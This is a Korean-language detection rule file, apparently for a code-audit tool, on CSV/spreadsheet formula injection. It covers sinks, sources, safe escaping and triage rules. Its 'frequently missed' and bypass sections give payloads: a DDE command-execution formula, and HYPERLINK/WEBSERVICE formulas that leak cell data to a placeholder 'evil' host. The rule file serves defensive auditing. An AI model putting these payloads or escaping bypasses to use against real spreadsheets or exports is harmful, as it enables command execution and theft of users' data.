---
id_prefix: CSVI
rules_dir: rules/
---

> ## 핵심 원칙: "수식이 CSV에 포함되지 않으면 취약점이 아니다"
>
> CSV/Excel 내보내기가 있다고 취약점이 아니다. `=`/`+`/`-`/`@`/`\t`/`\r` 같은 수식 시작 문자가 이스케이프 없이 셀에 들어가서, 스프레드시트 프로그램(Excel/Google Sheets/Numbers)에서 열었을 때 실제로 수식이 실행되어야 한다.

## Sink 의미론

CSV Injection sink는 "사용자 입력이 CSV/XLSX 셀의 값으로 기록되는 지점이며, 셀의 첫 글자가 수식 시작 문자가 될 수 있는 경우"이다. 라이브러리가 자동 이스케이프(앞에 `'` 추가)를 하면 sink가 아니다.

| 언어 | 라이브러리/sink |
|---|---|
| Node.js | `json2csv`, `csv-stringify`, `csv-writer`, 직접 문자열 연결 (`res.setHeader('Content-Type','text/csv')`), `exceljs` `cell.value=x`, `xlsx`, `xlsx-populate` |
| Python | `csv.writer`, `csv.DictWriter`, `pandas.to_csv/to_excel`, `openpyxl`, `xlsxwriter` |
| Java | Apache POI `cell.setCellValue(x)`, OpenCSV `writeNext`, 직접 문자열 |
| Ruby | `CSV.generate`, `CSV.open`, `roo`/`axlsx` |
| PHP | `fputcsv`, PhpSpreadsheet `setValue` |
| .NET | CsvHelper, EPPlus |

## Source-first 추가 패턴

- 사용자 입력 필드 (이름, 이메일, 주소, 메모, 댓글, 리뷰)
- 폼 제출 데이터가 관리자 대시보드에서 export
- 사용자 프로필이 보고서에 포함
- 게시글 제목/본문/태그
- 주문 정보, 배송 메모
- API 로그/감사 로그 export
- **백엔드 API proxy 패턴**: 앱이 직접 CSV 생성하지 않고 백엔드 응답을 `Content-Type: text/csv`로 그대로 전달. "앱이 직접 CSV를 생성하지 않으므로 해당 없음"은 잘못된 판단. 백엔드를 확인할 수 없으면 동적 테스트 필수.

## 자주 놓치는 패턴 (Frequently Missed)

- **`=cmd|'/c calc'!A1`** (DDE injection, Excel 한정): 단순 수식이 아닌 외부 명령 실행. 패치된 Excel에서는 경고 후 실행, 미패치는 즉시 RCE.
- **`=HYPERLINK("http://evil/?"&A1, "click")`**: 다른 셀 값을 외부로 유출.
- **`=WEBSERVICE("http://evil/?"&A1)`** (Excel Online): 자동 데이터 유출.
- **`=IMPORTXML/IMPORTDATA/IMPORTHTML`** (Google Sheets): 무경고 자동 fetch → 데이터 유출.
- **`@SUM(...)` 형식** (Lotus 1-2-3 호환 모드): `@`도 수식 시작 문자.
- **`-2+3`**: `-`도 수식. 음수 입력처럼 보이지만 실제로 평가됨.
- **탭/개행 시작**: `\t`/`\r`로 시작하는 셀이 옆 셀로 흘러가 인접 셀이 수식이 되는 케이스.
- **이스케이프된 후 다시 디코딩**: 서버는 이스케이프했지만 클라이언트가 디코딩 후 저장.
- **library 자동 이스케이프 부재**: 대부분의 CSV 라이브러리는 수식 이스케이프를 자동으로 하지 않음. quote escape (`"`)와 formula escape를 혼동.
- **JSON → CSV 변환 미들웨어**: 사용자가 만든 JSON 값에 수식 문자.
- **이메일 첨부 CSV 보고서**: 자동 발송, 수신자가 별도 검증 없이 열어봄.
- **`exceljs`의 `cell.value` vs `cell.formula`**: `value`에 `=...`을 넣으면 일부 버전이 수식으로 해석.
- **국제화 (한국어/일본어 등) 셀에서 BOM/공백 prefix 처리 미흡**.
- **Google Sheets `=IMAGE(url)`**: 이미지 URL fetch — 방문자 IP 추적 또는 SSRF 변형.
- **LibreOffice `=DDE(...)` 매크로**: Office와 유사 공격 벡터.
- **Excel Power Query (`M` language)**: Excel 2016+에서 `Web.Contents` 등으로 외부 fetch.
- **XLSX `xl/sharedStrings.xml` 내 `<t>` 요소 XSS**: 스프레드시트를 웹뷰에 렌더링하는 앱에서 XSS 변형.

## 안전 패턴 (FP Guard)

- **수식 이스케이프 함수 적용**: 셀 값이 `=`/`+`/`-`/`@`/`\t`/`\r`로 시작 시 앞에 `'` 추가 (Excel 표시는 prefix 제거됨).
- **`exceljs` `cell.value = {richText: [...]}`** 같은 명시적 텍스트 타입.
- **`xlsxwriter` `worksheet.write_string(row, col, x)`** 명시적 string 메서드.
- **OWASP Defender for Excel** 라이브러리.
- **Content-Type 명시 + Content-Disposition `attachment`** + 파일 확장자 `.txt` (CSV 대신, 단 사용성 손해).
- **단일 따옴표 prefix를 모든 셀에 일괄 적용**.

## 우회 가능 패턴

방어 처리가 보이지만 우회 가능한 경우 후보 사유에 우회 방식을 함께 기록한다.

| 방어 코드 | 우회 가능성 | 우회 방식 |
|---|---|---|
| `=` 시작 문자만 차단 | 가능 | `+`, `-`, `@`, `\t`, `\r` 누락. Lotus 호환 `@` 또는 음수 `-SUM(...)` |
| 첫 문자 검증 후 이스케이프 | 가능 | 앞에 공백/BOM/zero-width space 삽입하여 "첫 문자가 수식 아님"으로 판정, 스프레드시트가 공백 trim 후 수식으로 평가 |
| quote escape만 (`"` → `""`) | 가능 | 수식 escape와 다른 개념 — CSV 구문은 안전하나 수식은 그대로 평가됨 |
| 숫자 타입 강제 (`Apache POI setCellType`) | 부분 가능 | 사용자 입력이 숫자 외 필드로 흐르면 효과 없음 — text cell은 여전히 수식 평가 |

## 후보 판정 의사결정

| 조건 | 판정 |
|---|---|
| 사용자 입력 → CSV/XLSX 셀 + 수식 이스케이프 없음 | 후보 |
| 백엔드 API proxy + Content-Type text/csv + 백엔드 확인 불가 | 후보 (라벨: `BACKEND_PROXY`) |
| 수식 이스케이프 함수 호출 확인 (`=`/`+`/`-`/`@`/`\t`/`\r` 모두) | 제외 |
| 일부 문자만 이스케이프 (`=`만 차단, `@` 누락 등) | 후보 (라벨: `PARTIAL_ESCAPE`) |
| 셀 값이 숫자/날짜 타입으로 강제 (Apache POI `setCellType(NUMERIC)`) | 제외 |
| Export 대상이 시스템 내부 데이터만 (사용자 입력 미포함) | 제외 |

## 후보 판정 제한

외부 입력이 셀에 기록되고 수식 시작 문자(`=`/`+`/`-`/`@`/`\t`/`\r`) 이스케이프가 없는 경우만 후보.
